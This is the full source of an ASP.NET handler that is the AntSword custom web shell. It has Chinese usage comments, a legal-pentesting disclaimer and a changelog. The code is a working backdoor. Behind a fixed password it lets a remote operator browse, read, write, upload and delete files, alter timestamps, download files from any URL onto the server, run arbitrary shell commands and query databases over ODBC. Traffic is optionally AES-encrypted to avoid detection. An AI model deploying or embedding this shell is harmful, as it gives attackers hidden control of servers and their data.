<%--
/**
*              _   ____                       _
*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
* ———————————————————————————————————————————————
*     AntSword ASP.Net Custom Script for ODBC
* 
*     警告：
*         此脚本仅供合法的渗透测试以及爱好者参考学习
*          请勿用于非法用途，否则将追究其相关责任！
* ———————————————————————————————————————————————
*
* 使用说明：
*  1. AntSword >= v1.1-dev
*  2. 创建 Shell 时选择 custom 模式连接
*  3. 数据库连接使用 ODBC 连接字符串：
*     可以通过 ASPX 类型 Shell 查看部分连接字符串，具体参见 MSDN 官方文档：https://msdn.microsoft.com/zh-cn/library/system.data.odbc.odbcconnection.connectionstring(v=vs.80).aspx
*     例如：
*     (1) MySQL
*         Driver={MySql ODBC 5.2 Unicode Driver};Server=localhost;database=information_schema;UID=root;PWD=root;
*     (2) SQLServer
*         Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=sa;
*
*  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
*
*  5. 文件后缀可为 .aspx .ashx 只要是 ASP.Net 解析的文件后缀都是可以的。
*
* ChangeLog:
*
*   Date: 2019/08/29 v1.1
*    1. 新增 AES 编码/解码 支持 (thx @Ch1ngg)
*
*   Date: 2016/08/24 v1.0
*    1. 文件系统 和 terminal 管理
*    2. ODBC 数据库支持
*    3. 支持 base64 和 hex 编码
**/
--%>
<%@ WebHandler Language="C#" Class="Handler" %>

using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Security.Cryptography;

public class Handler : IHttpHandler
{
    public String pwd = "ant";
    

    public String encoder = "aes";
    // String encoder = "base64"; //base64
    // String encoder = "hex";    //hex(推荐)
    // String encoder = "aes";         // aes(加密方式见下文aes配置)
   
    public String cs = "UTF-8";
    public String key = "";
    public String SessionKey = "CUSTOMSESSID";

    // aes 加密配置项
    /*
    *  aes-128-cfb_zero_padding:
    *   - aes_mode: CFB
    *   - aes_padding: Zeros
    *   - aes_keylen: 16

    *  aes-256-ecb_zero_padding:
    *   - aes_mode: ECB
    *   - aes_padding: Zeros
    *   - aes_keylen: 32
    */
    // 注意: 以下4项为 encoder/decoder 共用
    // 如果需要请求和返回采用不同方式, 自行修改
    // aes_mode 和 aes_padding 均有默认设置值可设置为空, 详情请看下方源码
    public String aes_mode = "CFB";            // CBC|ECB|CFB|
    public String aes_padding = "Zeros";   // Zeros|NoPadding|PKCS7Padding
    public int aes_keylen = 16;                // 16|32  // 16(AES-128) 32(AES-256)
    public char aes_key_padding = 'a';       // 获取到的 key 位数不够时填充字符

    public void ProcessRequest(HttpContext context)
    {
        String Z = context.Request.Form[pwd];
        try
        {
            key = HttpContext.Current.Request.Cookies.Get(SessionKey).Value.ToString();
        }
        catch (Exception)
        {
            key = "";
        }
        if (Z != "")
        {
            String Z0 = decode(context.Request.Form["z0"]);
            String Z1 = decode(context.Request.Form["z1"]);
            String Z2 = decode(context.Request.Form["z2"]);
            String Z3 = decode(context.Request.Form["z3"]);
            String R = "";
            try
            {
                switch (Z)
                {
                    case "A":
                        {
                            String[] c = Directory.GetLogicalDrives();
                            R = String.Format("{0}\t", context.Server.MapPath("/"));
                            for (int i = 0; i < c.Length; i++)
                                R += c[i][0] + ":";
                            break;
                        }
                    case "B":
                        {
                            DirectoryInfo m = new DirectoryInfo(Z1);
                            foreach (DirectoryInfo D in m.GetDirectories())
                            {
                                R += String.Format("{0}/\t{1}\t0\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                            }
                            foreach (FileInfo D in m.GetFiles())
                            {
                                R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
                            }
                            break;
                        }
                    case "C":
                        {
                            StreamReader m = new StreamReader(Z1, Encoding.GetEncoding(cs));
                            R = m.ReadToEnd();
                            m.Close();
                            break;
                        }
                    case "D":
                        {
                            StreamWriter m = new StreamWriter(Z1, false, Encoding.GetEncoding(cs));
                            m.Write(Z2);
                            R = "1";
                            m.Close();
                            break;
                        }
                    case "E":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Delete(Z1, true);
                            }
                            else
                            {
                                File.Delete(Z1);
                            }
                            R = "1";
                            break;
                        }
                    case "F":
                        {
                            context.Response.Clear();
                            context.Response.Write("\x2D\x3E\x7C");
                            context.Response.WriteFile(Z1);
                            context.Response.Write("\x7C\x3C\x2D");
                            goto End;
                        }
                    case "U":
                        {
                            String P = Z1;
                            byte[] B = new Byte[Z2.Length / 2];
                            for (int i = 0; i < Z2.Length; i += 2)
                            {
                                B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                            }
                            FileStream fs = new FileStream(Z1, FileMode.OpenOrCreate);
                            fs.Seek(0, SeekOrigin.End);
                            fs.Write(B, 0, B.Length);
                            fs.Close();
                            R = "1";
                            break;
                        }
                    case "H":
                        {
                            CP(Z1, Z2, context);
                            R = "1";
                            break;
                        }
                    case "I":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Move(Z1, Z2);
                            }
                            else
                            {
                                File.Move(Z1, Z2);
                            }
                            R = "1";
                            break;
                        }
                    case "J":
                        {
                            Directory.CreateDirectory(Z1);
                            R = "1";
                            break;
                        }
                    case "K":
                        {
                            DateTime TM = Convert.ToDateTime(Z2);
                            if (Directory.Exists(Z1))
                            {
                                Directory.SetCreationTime(Z1, TM);
                                Directory.SetLastWriteTime(Z1, TM);
                                Directory.SetLastAccessTime(Z1, TM);
                            }
                            else
                            {
                                File.SetCreationTime(Z1, TM);
                                File.SetLastWriteTime(Z1, TM);
                                File.SetLastAccessTime(Z1, TM);
                            }
                            R = "1";
                            break;
                        }
                    case "L":
                        {
                            HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));
                            RQ.Method = "GET";
                            RQ.ContentType = "application/x-www-form-urlencoded";
                            HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
                            Stream WF = WB.GetResponseStream();
                            FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);
                            int i;
                            byte[] buffer = new byte[1024];
                            while (true)
                            {
                                i = WF.Read(buffer, 0, buffer.Length);
                                if (i < 1)
                                {
                                    break;
                                }
                                FS.Write(buffer, 0, i);
                            }
                            WF.Close();
                            WB.Close();
                            FS.Close();
                            R = "1";
                            break;
                        }
                    case "M":
                        {
                            ProcessStartInfo c = new ProcessStartInfo(Z1);
                            Process e = new Process();
                            StreamReader OT, ER;
                            c.UseShellExecute = false;
                            c.RedirectStandardInput = true;
                            c.RedirectStandardOutput = true;
                            c.RedirectStandardError = true;
                            c.CreateNoWindow = true;
                            e.StartInfo = c;
                            c.Arguments = "/c " + Z2;
                            e.Start();
                            OT = e.StandardOutput;
                            ER = e.StandardError;
                            e.Close();
                            R = OT.ReadToEnd() + ER.ReadToEnd();
                            break;
                        }
                    case "N":
                        {
                            System.Data.DataSet ds = new System.Data.DataSet();
                            String strCon = Z1;
                            string sql = "show databases";
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "\t", false);
                            }
                            break;
                        }
                    case "O":
                        {
                            String strCon = Z1, strDb = Z2;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            string sql = "show tables from " + strDb;
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "\t", false);
                            }
                            break;
                        }
                    case "P":
                        {
                            String strCon = Z1, strDb = Z2, strTable = Z3;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            string sql = "select * from " + strDb + "." + strTable + " limit 0,0";
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "", true);
                            }
                            break;
                        }
                    case "Q":
                        {
                            String strCon = Z1, sql = Z2;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t|\t", "\r\n", true);
                            }
                            break;
                        }
                    default: goto End;
                }
            }
            catch (Exception E)
            {
                R = "ERROR:// " + E.Message.ToString();
            }
            context.Response.Write("\x2D\x3E\x7C" + encode(R) + "\x7C\x3C\x2D");
        End:;
        }
    }


    public void CP(String S, String D, HttpContext context)
    {
        if (Directory.Exists(S))
        {
            DirectoryInfo m = new DirectoryInfo(S);
            Directory.CreateDirectory(D);
            foreach (FileInfo F in m.GetFiles())
            {
                File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
            }
            foreach (DirectoryInfo F in m.GetDirectories())
            {
                CP(S + "\\" + F.Name, D + "\\" + F.Name, context);
            }
        }
        else
        {
            File.Copy(S, D);
        }
    }
    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2), System.Globalization.NumberStyles.HexNumber))));
        }
        return sb.ToString();
    }
    public String encode(String src)
    {
        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                    {
                        //ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                        ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                        break;
                    }
                case "aes":
                    {
                        ret = EncryptAes(key, System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src)));
                        break;
                    }
                default:
                    {
                        ret = src;
                        break;
                    }
            }
        }
        catch (Exception E)
        {
            ret = E.Message.ToString();
        }
        return ret;
    }

    public String decode(String src)
    {
        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                    {
                        ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                        break;
                    }
                case "hex":
                    {
                        ret = HexAsciiConvert(src);
                        break;
                    }
                case "aes":
                    {
                        ret = DecryptAes(key, src).Replace("\0","");
                        break;
                    }
                default:
                    {
                        ret = src;
                        break;
                    }
            }
        }
        catch (Exception E)
        {
            ret = E.Message.ToString();
        }
        return ret;
    }



    public byte[] GetAesKey(string key)
    {
        if (key.Length < aes_keylen)
        {
            // 不足aes_keylen补全
            key = key.PadRight(aes_keylen, aes_key_padding);
        }
        if (key.Length > aes_keylen)
        {
            key = key.Substring(0, aes_keylen);
        }
        return Encoding.GetEncoding("UTF-8").GetBytes(key);
    }

    //获取加密类型
    public CipherMode GetMode(string mode)
    {
        if (mode.Equals("CFB"))
        {
            return CipherMode.CFB;
        }else if (mode.Equals("CBC"))
        {
            return CipherMode.CBC;
        }
        else if (mode.Equals("ECB"))
        {
            return CipherMode.ECB;
        }
        //默认CFB
        else
        {
            return CipherMode.CFB;
        }
    }
    //获取加密填充类型
    public PaddingMode GetPaddingMode(string paddingmode)
    {
        
        if (paddingmode.Equals("NoPadding"))
        {
            return PaddingMode.None;
        }else if (paddingmode.Equals("PKCS7Padding"))
        {
            return PaddingMode.PKCS7;
        }
        else if (paddingmode.Equals("Zeros"))
        {
            return PaddingMode.Zeros;
        }
        //默认Zeros
        else
        {
            return PaddingMode.Zeros;
        }
    }

    public string EncryptAes(string key, string toEncrypt)
    {

        byte[] keyArray = GetAesKey(key);
        byte[] toEncryptArray = Encoding.GetEncoding("UTF-8").GetBytes(toEncrypt);
        RijndaelManaged rDel = new RijndaelManaged();//using System.Security.Cryptography;
        rDel.Key = keyArray;
        rDel.IV = keyArray;
        rDel.Mode = GetMode(aes_mode);
        rDel.Padding = GetPaddingMode(aes_padding);
        ICryptoTransform cTransform = rDel.CreateEncryptor();
        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        return Convert.ToBase64String(resultArray, 0, resultArray.Length);
    }
    public string DecryptAes(string key, string toDecrypt)
    {
        byte[] keyArray = GetAesKey(key);
        byte[] toEncryptArray = Convert.FromBase64String(toDecrypt);
        RijndaelManaged rDel = new RijndaelManaged();
        rDel.Key = keyArray;
        rDel.IV = keyArray;
        rDel.Mode = GetMode(aes_mode);
        rDel.Padding = GetPaddingMode(aes_padding);
        ICryptoTransform cTransform = rDel.CreateDecryptor();
        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        return Encoding.GetEncoding("UTF-8").GetString(resultArray);
    }

    public string parseDataset(DataSet ds, String columnsep, String rowsep, bool needcoluname)
    {
        if (ds == null || ds.Tables.Count <= 0)
        {
            return "Status" + columnsep + rowsep + "True" + columnsep + rowsep;
        }
        StringBuilder sb = new StringBuilder();
        if (needcoluname)
        {
            for (int i = 0; i < ds.Tables[0].Columns.Count; i++)
            {
                sb.AppendFormat("{0}{1}", ds.Tables[0].Columns[i].ColumnName, columnsep);
            }
            sb.Append(rowsep);
        }
        foreach (DataTable dt in ds.Tables)
        {
            foreach (DataRow dr in dt.Rows)
            {
                for (int i = 0; i < dr.Table.Columns.Count; i++)
                {
                    sb.AppendFormat("{0}{1}", ObjToStr(dr[i]), columnsep);
                }
                sb.Append(rowsep);
            }
        }
        return sb.ToString();
    }

    public string ObjToStr(object ob)
    {
        if (ob == null)
        {
            return string.Empty;
        }
        else
        {
            return ob.ToString();
        }
    }
    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}